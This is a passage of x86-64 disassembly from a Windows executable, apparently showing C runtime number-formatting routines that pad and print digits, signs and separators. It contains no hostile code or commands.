   1400071b8:	83 e9 01             	sub    $0x1,%ecx
   1400071bb:	89 4b 0c             	mov    %ecx,0xc(%rbx)
   1400071be:	66 90                	xchg   %ax,%ax
   1400071c0:	48 89 da             	mov    %rbx,%rdx
   1400071c3:	b9 20 00 00 00       	mov    $0x20,%ecx
   1400071c8:	e8 d3 f9 ff ff       	call   0x140006ba0
   1400071cd:	8b 43 0c             	mov    0xc(%rbx),%eax
   1400071d0:	8d 50 ff             	lea    -0x1(%rax),%edx
   1400071d3:	85 c0                	test   %eax,%eax
   1400071d5:	89 53 0c             	mov    %edx,0xc(%rbx)
   1400071d8:	7f e6                	jg     0x1400071c0
   1400071da:	85 ed                	test   %ebp,%ebp
   1400071dc:	0f 84 a8 fe ff ff    	je     0x14000708a
   1400071e2:	48 89 da             	mov    %rbx,%rdx
   1400071e5:	b9 2d 00 00 00       	mov    $0x2d,%ecx
   1400071ea:	e8 b1 f9 ff ff       	call   0x140006ba0
   1400071ef:	e9 aa fe ff ff       	jmp    0x14000709e
   1400071f4:	8b 43 10             	mov    0x10(%rbx),%eax
   1400071f7:	85 c0                	test   %eax,%eax
   1400071f9:	7f 55                	jg     0x140007250
   1400071fb:	f6 43 09 08          	testb  $0x8,0x9(%rbx)
   1400071ff:	75 4f                	jne    0x140007250
   140007201:	83 e8 01             	sub    $0x1,%eax
   140007204:	89 43 10             	mov    %eax,0x10(%rbx)
   140007207:	48 83 c4 20          	add    $0x20,%rsp
   14000720b:	5b                   	pop    %rbx
   14000720c:	5e                   	pop    %rsi
   14000720d:	5f                   	pop    %rdi
   14000720e:	5d                   	pop    %rbp
   14000720f:	41 5c                	pop    %r12
   140007211:	c3                   	ret
   140007212:	29 c1                	sub    %eax,%ecx
   140007214:	85 c0                	test   %eax,%eax
   140007216:	89 4b 0c             	mov    %ecx,0xc(%rbx)
   140007219:	0f 8e 21 01 00 00    	jle    0x140007340
   14000721f:	83 e9 01             	sub    $0x1,%ecx
   140007222:	85 f6                	test   %esi,%esi
   140007224:	89 4b 0c             	mov    %ecx,0xc(%rbx)
   140007227:	0f 8e 58 ff ff ff    	jle    0x140007185
   14000722d:	f6 43 09 10          	testb  $0x10,0x9(%rbx)
   140007231:	0f 84 4e ff ff ff    	je     0x140007185
   140007237:	66 83 7b 20 00       	cmpw   $0x0,0x20(%rbx)
   14000723c:	0f 84 43 ff ff ff    	je     0x140007185
   140007242:	e9 fc fe ff ff       	jmp    0x140007143
   140007247:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000724e:	00 00 
   140007250:	48 89 d9             	mov    %rbx,%rcx
   140007253:	e8 d8 fb ff ff       	call   0x140006e30
   140007258:	eb 21                	jmp    0x14000727b
   14000725a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140007260:	0f b6 07             	movzbl (%rdi),%eax
   140007263:	b9 30 00 00 00       	mov    $0x30,%ecx
   140007268:	84 c0                	test   %al,%al
   14000726a:	74 07                	je     0x140007273
   14000726c:	48 83 c7 01          	add    $0x1,%rdi
   140007270:	0f be c8             	movsbl %al,%ecx
   140007273:	48 89 da             	mov    %rbx,%rdx
   140007276:	e8 25 f9 ff ff       	call   0x140006ba0
   14000727b:	8b 43 10             	mov    0x10(%rbx),%eax
   14000727e:	8d 50 ff             	lea    -0x1(%rax),%edx
   140007281:	85 c0                	test   %eax,%eax
   140007283:	89 53 10             	mov    %edx,0x10(%rbx)
   140007286:	7f d8                	jg     0x140007260
   140007288:	48 83 c4 20          	add    $0x20,%rsp
   14000728c:	5b                   	pop    %rbx
   14000728d:	5e                   	pop    %rsi
   14000728e:	5f                   	pop    %rdi
   14000728f:	5d                   	pop    %rbp
   140007290:	41 5c                	pop    %r12
   140007292:	c3                   	ret
   140007293:	85 c9                	test   %ecx,%ecx
   140007295:	0f 8e 35 01 00 00    	jle    0x1400073d0
   14000729b:	83 e9 01             	sub    $0x1,%ecx
   14000729e:	41 89 49 0c          	mov    %ecx,0xc(%r9)
   1400072a2:	e9 bb fd ff ff       	jmp    0x140007062
   1400072a7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   1400072ae:	00 00 
   1400072b0:	83 e9 01             	sub    $0x1,%ecx
   1400072b3:	89 4b 0c             	mov    %ecx,0xc(%rbx)
   1400072b6:	0f 84 26 ff ff ff    	je     0x1400071e2
   1400072bc:	f7 43 08 00 06 00 00 	testl  $0x600,0x8(%rbx)
   1400072c3:	0f 84 ef fe ff ff    	je     0x1400071b8
   1400072c9:	48 89 da             	mov    %rbx,%rdx
   1400072cc:	b9 2d 00 00 00       	mov    $0x2d,%ecx
   1400072d1:	e8 ca f8 ff ff       	call   0x140006ba0
   1400072d6:	e9 c3 fd ff ff       	jmp    0x14000709e
   1400072db:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400072e0:	48 89 da             	mov    %rbx,%rdx
   1400072e3:	b9 30 00 00 00       	mov    $0x30,%ecx
   1400072e8:	e8 b3 f8 ff ff       	call   0x140006ba0
   1400072ed:	8b 43 10             	mov    0x10(%rbx),%eax
   1400072f0:	85 c0                	test   %eax,%eax
   1400072f2:	7f 0f                	jg     0x140007303
   1400072f4:	f6 43 09 08          	testb  $0x8,0x9(%rbx)
   1400072f8:	75 09                	jne    0x140007303
   1400072fa:	85 f6                	test   %esi,%esi
   1400072fc:	75 18                	jne    0x140007316
   1400072fe:	e9 fe fe ff ff       	jmp    0x140007201
   140007303:	48 89 d9             	mov    %rbx,%rcx
   140007306:	e8 25 fb ff ff       	call   0x140006e30
   14000730b:	85 f6                	test   %esi,%esi
   14000730d:	0f 84 68 ff ff ff    	je     0x14000727b
   140007313:	8b 43 10             	mov    0x10(%rbx),%eax
   140007316:	01 f0                	add    %esi,%eax
   140007318:	89 43 10             	mov    %eax,0x10(%rbx)
   14000731b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007320:	48 89 da             	mov    %rbx,%rdx
   140007323:	b9 30 00 00 00       	mov    $0x30,%ecx
   140007328:	e8 73 f8 ff ff       	call   0x140006ba0
   14000732d:	83 c6 01             	add    $0x1,%esi
   140007330:	75 ee                	jne    0x140007320
   140007332:	e9 44 ff ff ff       	jmp    0x14000727b
   140007337:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000733e:	00 00 
   140007340:	8b 43 08             	mov    0x8(%rbx),%eax
   140007343:	f6 c4 08             	test   $0x8,%ah
   140007346:	0f 85 d3 fe ff ff    	jne    0x14000721f
   14000734c:	85 f6                	test   %esi,%esi
   14000734e:	0f 8e 39 fe ff ff    	jle    0x14000718d
   140007354:	f6 c4 10             	test   $0x10,%ah
   140007357:	0f 84 30 fe ff ff    	je     0x14000718d
   14000735d:	66 83 7b 20 00       	cmpw   $0x0,0x20(%rbx)
   140007362:	0f 84 25 fe ff ff    	je     0x14000718d
   140007368:	e9 d6 fd ff ff       	jmp    0x140007143
   14000736d:	0f 1f 00             	nopl   (%rax)
   140007370:	48 89 da             	mov    %rbx,%rdx
   140007373:	b9 2b 00 00 00       	mov    $0x2b,%ecx
   140007378:	e8 23 f8 ff ff       	call   0x140006ba0
   14000737d:	e9 1c fd ff ff       	jmp    0x14000709e
   140007382:	83 e8 01             	sub    $0x1,%eax
   140007385:	89 43 0c             	mov    %eax,0xc(%rbx)
   140007388:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000738f:	00 
   140007390:	48 89 da             	mov    %rbx,%rdx
   140007393:	b9 30 00 00 00       	mov    $0x30,%ecx
   140007398:	e8 03 f8 ff ff       	call   0x140006ba0
   14000739d:	8b 43 0c             	mov    0xc(%rbx),%eax
   1400073a0:	8d 50 ff             	lea    -0x1(%rax),%edx
   1400073a3:	85 c0                	test   %eax,%eax
   1400073a5:	89 53 0c             	mov    %edx,0xc(%rbx)
   1400073a8:	7f e6                	jg     0x140007390
   1400073aa:	e9 0b fd ff ff       	jmp    0x1400070ba
   1400073af:	90                   	nop
   1400073b0:	f6 c4 06             	test   $0x6,%ah
   1400073b3:	0f 85 d4 fc ff ff    	jne    0x14000708d
   1400073b9:	8b 53 0c             	mov    0xc(%rbx),%edx
   1400073bc:	8d 4a ff             	lea    -0x1(%rdx),%ecx
   1400073bf:	85 d2                	test   %edx,%edx
   1400073c1:	89 4b 0c             	mov    %ecx,0xc(%rbx)
   1400073c4:	0f 8e c3 fc ff ff    	jle    0x14000708d
   1400073ca:	e9 f1 fd ff ff       	jmp    0x1400071c0
   1400073cf:	90                   	nop
   1400073d0:	0f 84 8c fc ff ff    	je     0x140007062
   1400073d6:	41 c7 41 0c ff ff ff 	movl   $0xffffffff,0xc(%r9)
   1400073dd:	ff 
   1400073de:	e9 9f fc ff ff       	jmp    0x140007082
   1400073e3:	48 89 da             	mov    %rbx,%rdx
   1400073e6:	b9 20 00 00 00       	mov    $0x20,%ecx
   1400073eb:	e8 b0 f7 ff ff       	call   0x140006ba0
   1400073f0:	e9 a9 fc ff ff       	jmp    0x14000709e
   1400073f5:	c7 43 0c 00 00 00 00 	movl   $0x0,0xc(%rbx)
   1400073fc:	e9 81 fc ff ff       	jmp    0x140007082
   140007401:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007406:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000740d:	00 00 00 
   140007410:	56                   	push   %rsi
   140007411:	53                   	push   %rbx
   140007412:	48 83 ec 28          	sub    $0x28,%rsp
   140007416:	48 8d 05 5b 23 38 00 	lea    0x38235b(%rip),%rax        # 0x140389778
   14000741d:	48 89 d6             	mov    %rdx,%rsi
   140007420:	48 63 52 10          	movslq 0x10(%rdx),%rdx
   140007424:	48 85 c9             	test   %rcx,%rcx
   140007427:	48 89 cb             	mov    %rcx,%rbx
   14000742a:	48 0f 44 d8          	cmove  %rax,%rbx
   14000742e:	48 89 d9             	mov    %rbx,%rcx
   140007431:	85 d2                	test   %edx,%edx
   140007433:	78 1b                	js     0x140007450
   140007435:	e8 46 41 00 00       	call   0x14000b580
   14000743a:	49 89 f0             	mov    %rsi,%r8
   14000743d:	89 c2                	mov    %eax,%edx
   14000743f:	48 89 d9             	mov    %rbx,%rcx
   140007442:	48 83 c4 28          	add    $0x28,%rsp
   140007446:	5b                   	pop    %rbx
   140007447:	5e                   	pop    %rsi
   140007448:	e9 b3 f7 ff ff       	jmp    0x140006c00
   14000744d:	0f 1f 00             	nopl   (%rax)
   140007450:	e8 9b 46 00 00       	call   0x14000baf0
   140007455:	eb e3                	jmp    0x14000743a
   140007457:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000745e:	00 00 
   140007460:	48 83 ec 68          	sub    $0x68,%rsp
   140007464:	48 8b 02             	mov    (%rdx),%rax
   140007467:	8b 52 08             	mov    0x8(%rdx),%edx
   14000746a:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   14000746f:	41 89 d3             	mov    %edx,%r11d
   140007472:	89 54 24 58          	mov    %edx,0x58(%rsp)
   140007476:	49 89 d2             	mov    %rdx,%r10
   140007479:	66 41 81 e3 ff 7f    	and    $0x7fff,%r11w
   14000747f:	75 7f                	jne    0x140007500
   140007481:	48 89 c2             	mov    %rax,%rdx
   140007484:	48 c1 ea 20          	shr    $0x20,%rdx
   140007488:	09 d0                	or     %edx,%eax
   14000748a:	74 64                	je     0x1400074f0
   14000748c:	85 d2                	test   %edx,%edx
   14000748e:	0f 89 9c 00 00 00    	jns    0x140007530
   140007494:	41 0f bf d3          	movswl %r11w,%edx
   140007498:	c7 44 24 44 01 00 00 	movl   $0x1,0x44(%rsp)
   14000749f:	00 
   1400074a0:	81 ea 3e 40 00 00    	sub    $0x403e,%edx
   1400074a6:	41 81 e2 00 80 00 00 	and    $0x8000,%r10d
   1400074ad:	48 8b 84 24 90 00 00 	mov    0x90(%rsp),%rax
   1400074b4:	00 
   1400074b5:	44 89 10             	mov    %r10d,(%rax)
   1400074b8:	48 8d 44 24 48       	lea    0x48(%rsp),%rax
   1400074bd:	4c 89 4c 24 30       	mov    %r9,0x30(%rsp)
   1400074c2:	4c 8d 4c 24 44       	lea    0x44(%rsp),%r9
   1400074c7:	44 89 44 24 28       	mov    %r8d,0x28(%rsp)
   1400074cc:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   1400074d1:	89 4c 24 20          	mov    %ecx,0x20(%rsp)
   1400074d5:	48 8d 0d d4 0f 38 00 	lea    0x380fd4(%rip),%rcx        # 0x1403884b0
   1400074dc:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   1400074e1:	e8 aa 1d 00 00       	call   0x140009290
   1400074e6:	48 83 c4 68          	add    $0x68,%rsp
   1400074ea:	c3                   	ret
   1400074eb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400074f0:	c7 44 24 44 00 00 00 	movl   $0x0,0x44(%rsp)
   1400074f7:	00 
   1400074f8:	31 d2                	xor    %edx,%edx
   1400074fa:	eb aa                	jmp    0x1400074a6
   1400074fc:	0f 1f 40 00          	nopl   0x0(%rax)
   140007500:	66 41 81 fb ff 7f    	cmp    $0x7fff,%r11w
   140007506:	75 8c                	jne    0x140007494
   140007508:	48 89 c2             	mov    %rax,%rdx
   14000750b:	48 c1 ea 20          	shr    $0x20,%rdx
   14000750f:	81 e2 ff ff ff 7f    	and    $0x7fffffff,%edx
   140007515:	09 c2                	or     %eax,%edx
   140007517:	74 29                	je     0x140007542
   140007519:	c7 44 24 44 04 00 00 	movl   $0x4,0x44(%rsp)
   140007520:	00 
   140007521:	31 d2                	xor    %edx,%edx
   140007523:	45 31 d2             	xor    %r10d,%r10d
   140007526:	eb 85                	jmp    0x1400074ad
   140007528:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000752f:	00 
   140007530:	c7 44 24 44 02 00 00 	movl   $0x2,0x44(%rsp)
   140007537:	00 
   140007538:	ba c3 bf ff ff       	mov    $0xffffbfc3,%edx
   14000753d:	e9 64 ff ff ff       	jmp    0x1400074a6
   140007542:	c7 44 24 44 03 00 00 	movl   $0x3,0x44(%rsp)
   140007549:	00 
   14000754a:	31 d2                	xor    %edx,%edx
   14000754c:	e9 55 ff ff ff       	jmp    0x1400074a6
   140007551:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007556:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000755d:	00 00 00 
   140007560:	56                   	push   %rsi
   140007561:	53                   	push   %rbx
   140007562:	48 83 ec 58          	sub    $0x58,%rsp
   140007566:	44 8b 42 10          	mov    0x10(%rdx),%r8d
   14000756a:	db 29                	fldt   (%rcx)
   14000756c:	45 85 c0             	test   %r8d,%r8d
   14000756f:	48 89 d3             	mov    %rdx,%rbx
   140007572:	79 0d                	jns    0x140007581
   140007574:	c7 42 10 06 00 00 00 	movl   $0x6,0x10(%rdx)
   14000757b:	41 b8 06 00 00 00    	mov    $0x6,%r8d
   140007581:	48 8d 44 24 48       	lea    0x48(%rsp),%rax
   140007586:	b9 03 00 00 00       	mov    $0x3,%ecx
   14000758b:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140007590:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140007595:	db 7c 24 30          	fstpt  0x30(%rsp)
   140007599:	4c 8d 4c 24 4c       	lea    0x4c(%rsp),%r9
   14000759e:	e8 bd fe ff ff       	call   0x140007460
   1400075a3:	44 8b 44 24 4c       	mov    0x4c(%rsp),%r8d
   1400075a8:	48 89 c6             	mov    %rax,%rsi
   1400075ab:	41 81 f8 00 80 ff ff 	cmp    $0xffff8000,%r8d
   1400075b2:	74 3c                	je     0x1400075f0
   1400075b4:	8b 4c 24 48          	mov    0x48(%rsp),%ecx
   1400075b8:	49 89 d9             	mov    %rbx,%r9
   1400075bb:	48 89 c2             	mov    %rax,%rdx
   1400075be:	e8 6d fa ff ff       	call   0x140007030
   1400075c3:	eb 0d                	jmp    0x1400075d2
   1400075c5:	48 89 da             	mov    %rbx,%rdx
   1400075c8:	b9 20 00 00 00       	mov    $0x20,%ecx
   1400075cd:	e8 ce f5 ff ff       	call   0x140006ba0
   1400075d2:	8b 43 0c             	mov    0xc(%rbx),%eax
   1400075d5:	8d 50 ff             	lea    -0x1(%rax),%edx
   1400075d8:	85 c0                	test   %eax,%eax
   1400075da:	89 53 0c             	mov    %edx,0xc(%rbx)
   1400075dd:	7f e6                	jg     0x1400075c5
   1400075df:	48 89 f1             	mov    %rsi,%rcx
   1400075e2:	e8 09 1b 00 00       	call   0x1400090f0
   1400075e7:	90                   	nop
   1400075e8:	48 83 c4 58          	add    $0x58,%rsp
   1400075ec:	5b                   	pop    %rbx
   1400075ed:	5e                   	pop    %rsi
   1400075ee:	c3                   	ret
   1400075ef:	90                   	nop
   1400075f0:	8b 4c 24 48          	mov    0x48(%rsp),%ecx
   1400075f4:	49 89 d8             	mov    %rbx,%r8
   1400075f7:	48 89 c2             	mov    %rax,%rdx
   1400075fa:	e8 91 f7 ff ff       	call   0x140006d90
   1400075ff:	48 89 f1             	mov    %rsi,%rcx
   140007602:	e8 e9 1a 00 00       	call   0x1400090f0
   140007607:	90                   	nop
   140007608:	48 83 c4 58          	add    $0x58,%rsp
   14000760c:	5b                   	pop    %rbx
   14000760d:	5e                   	pop    %rsi
   14000760e:	c3                   	ret
   14000760f:	90                   	nop
   140007610:	55                   	push   %rbp
   140007611:	41 56                	push   %r14
   140007613:	41 55                	push   %r13
   140007615:	41 54                	push   %r12
   140007617:	57                   	push   %rdi
   140007618:	56                   	push   %rsi
   140007619:	53                   	push   %rbx
   14000761a:	48 89 e5             	mov    %rsp,%rbp
   14000761d:	48 83 ec 20          	sub    $0x20,%rsp
   140007621:	41 b8 00 00 00 00    	mov    $0x0,%r8d
   140007627:	44 8b 6a 10          	mov    0x10(%rdx),%r13d
   14000762b:	44 8b 52 08          	mov    0x8(%rdx),%r10d
   14000762f:	45 85 ed             	test   %r13d,%r13d
   140007632:	48 89 d3             	mov    %rdx,%rbx
   140007635:	45 0f 49 c5          	cmovns %r13d,%r8d
   140007639:	41 83 c0 17          	add    $0x17,%r8d
   14000763d:	41 f7 c2 00 10 00 00 	test   $0x1000,%r10d
   140007644:	74 0b                	je     0x140007651
   140007646:	66 83 7a 20 00       	cmpw   $0x0,0x20(%rdx)
   14000764b:	0f 85 ff 01 00 00    	jne    0x140007850
   140007651:	4c 63 5b 0c          	movslq 0xc(%rbx),%r11
   140007655:	49 63 c0             	movslq %r8d,%rax
   140007658:	45 39 c3             	cmp    %r8d,%r11d
   14000765b:	49 0f 4d c3          	cmovge %r11,%rax
   14000765f:	48 83 c0 0f          	add    $0xf,%rax
   140007663:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   140007667:	e8 a4 f0 ff ff       	call   0x140006710
   14000766c:	48 29 c4             	sub    %rax,%rsp
   14000766f:	41 f6 c2 80          	test   $0x80,%r10b
   140007673:	48 8d 7c 24 20       	lea    0x20(%rsp),%rdi
   140007678:	74 11                	je     0x14000768b
   14000767a:	48 85 c9             	test   %rcx,%rcx
   14000767d:	0f 88 e1 01 00 00    	js     0x140007864
   140007683:	41 80 e2 7f          	and    $0x7f,%r10b
   140007687:	44 89 53 08          	mov    %r10d,0x8(%rbx)
   14000768b:	48 85 c9             	test   %rcx,%rcx
   14000768e:	49 89 fc             	mov    %rdi,%r12
   140007691:	0f 84 89 00 00 00    	je     0x140007720
   140007697:	49 b9 cd cc cc cc cc 	movabs $0xcccccccccccccccd,%r9
   14000769e:	cc cc cc 
   1400076a1:	44 89 d6             	mov    %r10d,%esi
   1400076a4:	49 89 f8             	mov    %rdi,%r8
   1400076a7:	81 e6 00 10 00 00    	and    $0x1000,%esi
   1400076ad:	0f 1f 00             	nopl   (%rax)
   1400076b0:	4d 8d 60 01          	lea    0x1(%r8),%r12
   1400076b4:	4c 39 c7             	cmp    %r8,%rdi
   1400076b7:	74 37                	je     0x1400076f0
   1400076b9:	85 f6                	test   %esi,%esi
   1400076bb:	74 33                	je     0x1400076f0
   1400076bd:	66 83 7b 20 00       	cmpw   $0x0,0x20(%rbx)
   1400076c2:	74 2c                	je     0x1400076f0
   1400076c4:	4c 89 c0             	mov    %r8,%rax
   1400076c7:	48 29 f8             	sub    %rdi,%rax
   1400076ca:	48 99                	cqto
   1400076cc:	48 c1 ea 3e          	shr    $0x3e,%rdx
   1400076d0:	48 01 d0             	add    %rdx,%rax
   1400076d3:	83 e0 03             	and    $0x3,%eax
   1400076d6:	48 29 d0             	sub    %rdx,%rax
   1400076d9:	48 83 f8 03          	cmp    $0x3,%rax
   1400076dd:	75 11                	jne    0x1400076f0
   1400076df:	49 8d 40 02          	lea    0x2(%r8),%rax
   1400076e3:	41 c6 00 2c          	movb   $0x2c,(%r8)
   1400076e7:	4d 89 e0             	mov    %r12,%r8
   1400076ea:	49 89 c4             	mov    %rax,%r12
   1400076ed:	0f 1f 00             	nopl   (%rax)
   1400076f0:	48 89 c8             	mov    %rcx,%rax
   1400076f3:	49 89 ce             	mov    %rcx,%r14
   1400076f6:	49 f7 e1             	mul    %r9
   1400076f9:	48 c1 ea 03          	shr    $0x3,%rdx
   1400076fd:	48 8d 04 92          	lea    (%rdx,%rdx,4),%rax
   140007701:	48 01 c0             	add    %rax,%rax
   140007704:	49 29 c6             	sub    %rax,%r14
   140007707:	4c 89 f0             	mov    %r14,%rax
   14000770a:	83 c0 30             	add    $0x30,%eax
   14000770d:	48 83 f9 09          	cmp    $0x9,%rcx
   140007711:	41 88 00             	mov    %al,(%r8)
   140007714:	4d 89 e0             	mov    %r12,%r8
   140007717:	76 07                	jbe    0x140007720
   140007719:	48 89 d1             	mov    %rdx,%rcx
   14000771c:	eb 92                	jmp    0x1400076b0
   14000771e:	66 90                	xchg   %ax,%ax
   140007720:	45 85 ed             	test   %r13d,%r13d
   140007723:	0f 8e 47 01 00 00    	jle    0x140007870
   140007729:	4c 89 e0             	mov    %r12,%rax
   14000772c:	44 89 ee             	mov    %r13d,%esi
   14000772f:	48 29 f8             	sub    %rdi,%rax
   140007732:	29 c6                	sub    %eax,%esi
   140007734:	85 f6                	test   %esi,%esi
   140007736:	89 f0                	mov    %esi,%eax
   140007738:	7e 2b                	jle    0x140007765
   14000773a:	83 e8 01             	sub    $0x1,%eax
   14000773d:	49 8d 54 04 01       	lea    0x1(%r12,%rax,1),%rdx
   140007742:	48 89 c1             	mov    %rax,%rcx
   140007745:	4c 89 e0             	mov    %r12,%rax
   140007748:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000774f:	00 
   140007750:	48 83 c0 01          	add    $0x1,%rax
   140007754:	c6 40 ff 30          	movb   $0x30,-0x1(%rax)
   140007758:	48 39 c2             	cmp    %rax,%rdx
   14000775b:	75 f3                	jne    0x140007750
   14000775d:	48 63 c1             	movslq %ecx,%rax
   140007760:	4d 8d 64 04 01       	lea    0x1(%r12,%rax,1),%r12
   140007765:	4c 39 e7             	cmp    %r12,%rdi
   140007768:	0f 84 14 01 00 00    	je     0x140007882
   14000776e:	45 85 db             	test   %r11d,%r11d
   140007771:	7e 5d                	jle    0x1400077d0
   140007773:	4c 89 e0             	mov    %r12,%rax
   140007776:	48 29 f8             	sub    %rdi,%rax
   140007779:	41 29 c3             	sub    %eax,%r11d
   14000777c:	45 85 db             	test   %r11d,%r11d
   14000777f:	44 89 5b 0c          	mov    %r11d,0xc(%rbx)
   140007783:	7e 4b                	jle    0x1400077d0
   140007785:	41 f7 c2 c0 01 00 00 	test   $0x1c0,%r10d
   14000778c:	0f 85 1e 01 00 00    	jne    0x1400078b0
   140007792:	45 85 ed             	test   %r13d,%r13d
   140007795:	0f 88 26 01 00 00    	js     0x1400078c1
   14000779b:	41 f7 c2 00 04 00 00 	test   $0x400,%r10d
   1400077a2:	75 2c                	jne    0x1400077d0
   1400077a4:	8b 43 0c             	mov    0xc(%rbx),%eax
   1400077a7:	8d 50 ff             	lea    -0x1(%rax),%edx
   1400077aa:	85 c0                	test   %eax,%eax
   1400077ac:	89 53 0c             	mov    %edx,0xc(%rbx)
   1400077af:	7e 1f                	jle    0x1400077d0
   1400077b1:	48 89 da             	mov    %rbx,%rdx
   1400077b4:	b9 20 00 00 00       	mov    $0x20,%ecx
   1400077b9:	e8 e2 f3 ff ff       	call   0x140006ba0
   1400077be:	8b 43 0c             	mov    0xc(%rbx),%eax
   1400077c1:	8d 50 ff             	lea    -0x1(%rax),%edx
   1400077c4:	85 c0                	test   %eax,%eax
   1400077c6:	89 53 0c             	mov    %edx,0xc(%rbx)
   1400077c9:	7f e6                	jg     0x1400077b1
   1400077cb:	44 8b 53 08          	mov    0x8(%rbx),%r10d
   1400077cf:	90                   	nop
   1400077d0:	41 f6 c2 80          	test   $0x80,%r10b
   1400077d4:	75 6a                	jne    0x140007840
   1400077d6:	41 f7 c2 00 01 00 00 	test   $0x100,%r10d
   1400077dd:	0f 84 ad 00 00 00    	je     0x140007890
   1400077e3:	49 8d 74 24 01       	lea    0x1(%r12),%rsi
   1400077e8:	41 c6 04 24 2b       	movb   $0x2b,(%r12)
   1400077ed:	48 39 f7             	cmp    %rsi,%rdi
   1400077f0:	73 2e                	jae    0x140007820
   1400077f2:	48 83 ee 01          	sub    $0x1,%rsi
   1400077f6:	0f be 0e             	movsbl (%rsi),%ecx
   1400077f9:	48 89 da             	mov    %rbx,%rdx
   1400077fc:	e8 9f f3 ff ff       	call   0x140006ba0
   140007801:	48 39 f7             	cmp    %rsi,%rdi
   140007804:	75 ec                	jne    0x1400077f2
   140007806:	8b 43 0c             	mov    0xc(%rbx),%eax
   140007809:	8d 50 ff             	lea    -0x1(%rax),%edx
   14000780c:	85 c0                	test   %eax,%eax
   14000780e:	89 53 0c             	mov    %edx,0xc(%rbx)
   140007811:	7e 1a                	jle    0x14000782d
   140007813:	48 89 da             	mov    %rbx,%rdx
   140007816:	b9 20 00 00 00       	mov    $0x20,%ecx
   14000781b:	e8 80 f3 ff ff       	call   0x140006ba0
   140007820:	8b 43 0c             	mov    0xc(%rbx),%eax
   140007823:	8d 50 ff             	lea    -0x1(%rax),%edx
   140007826:	85 c0                	test   %eax,%eax
   140007828:	89 53 0c             	mov    %edx,0xc(%rbx)
   14000782b:	7f e6                	jg     0x140007813
   14000782d:	48 89 ec             	mov    %rbp,%rsp
   140007830:	5b                   	pop    %rbx
   140007831:	5e                   	pop    %rsi
   140007832:	5f                   	pop    %rdi
   140007833:	41 5c                	pop    %r12
   140007835:	41 5d                	pop    %r13
   140007837:	41 5e                	pop    %r14
   140007839:	5d                   	pop    %rbp
   14000783a:	c3                   	ret
   14000783b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007840:	49 8d 74 24 01       	lea    0x1(%r12),%rsi
   140007845:	41 c6 04 24 2d       	movb   $0x2d,(%r12)
   14000784a:	eb a1                	jmp    0x1400077ed
   14000784c:	0f 1f 40 00          	nopl   0x0(%rax)
   140007850:	44 89 c0             	mov    %r8d,%eax
   140007853:	ba ab aa aa aa       	mov    $0xaaaaaaab,%edx
   140007858:	f7 e2                	mul    %edx
   14000785a:	d1 ea                	shr    $1,%edx
   14000785c:	41 01 d0             	add    %edx,%r8d
   14000785f:	e9 ed fd ff ff       	jmp    0x140007651
   140007864:	48 f7 d9             	neg    %rcx
   140007867:	e9 2b fe ff ff       	jmp    0x140007697
   14000786c:	0f 1f 40 00          	nopl   0x0(%rax)
   140007870:	4c 39 e7             	cmp    %r12,%rdi
   140007873:	0f 85 f5 fe ff ff    	jne    0x14000776e
   140007879:	45 85 ed             	test   %r13d,%r13d
   14000787c:	0f 84 ec fe ff ff    	je     0x14000776e
   140007882:	41 c6 04 24 30       	movb   $0x30,(%r12)
   140007887:	49 83 c4 01          	add    $0x1,%r12
   14000788b:	e9 de fe ff ff       	jmp    0x14000776e
   140007890:	41 83 e2 40          	and    $0x40,%r10d
   140007894:	4c 89 e6             	mov    %r12,%rsi
   140007897:	0f 84 50 ff ff ff    	je     0x1400077ed
   14000789d:	48 83 c6 01          	add    $0x1,%rsi
   1400078a1:	41 c6 04 24 20       	movb   $0x20,(%r12)
   1400078a6:	e9 42 ff ff ff       	jmp    0x1400077ed
   1400078ab:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400078b0:	41 83 eb 01          	sub    $0x1,%r11d
   1400078b4:	45 85 ed             	test   %r13d,%r13d
   1400078b7:	44 89 5b 0c          	mov    %r11d,0xc(%rbx)
   1400078bb:	0f 89 da fe ff ff    	jns    0x14000779b
   1400078c1:	44 89 d0             	mov    %r10d,%eax
   1400078c4:	25 00 06 00 00       	and    $0x600,%eax
   1400078c9:	3d 00 02 00 00       	cmp    $0x200,%eax
   1400078ce:	0f 85 c7 fe ff ff    	jne    0x14000779b
   1400078d4:	8b 53 0c             	mov    0xc(%rbx),%edx
   1400078d7:	8d 42 ff             	lea    -0x1(%rdx),%eax
   1400078da:	85 d2                	test   %edx,%edx
   1400078dc:	89 43 0c             	mov    %eax,0xc(%rbx)
   1400078df:	0f 8e eb fe ff ff    	jle    0x1400077d0
   1400078e5:	89 c1                	mov    %eax,%ecx
   1400078e7:	4c 89 e0             	mov    %r12,%rax
   1400078ea:	49 8d 54 0c 01       	lea    0x1(%r12,%rcx,1),%rdx
   1400078ef:	90                   	nop
   1400078f0:	48 83 c0 01          	add    $0x1,%rax
   1400078f4:	c6 40 ff 30          	movb   $0x30,-0x1(%rax)
   1400078f8:	48 39 d0             	cmp    %rdx,%rax
   1400078fb:	75 f3                	jne    0x1400078f0
   1400078fd:	4d 8d 64 0c 01       	lea    0x1(%r12,%rcx,1),%r12
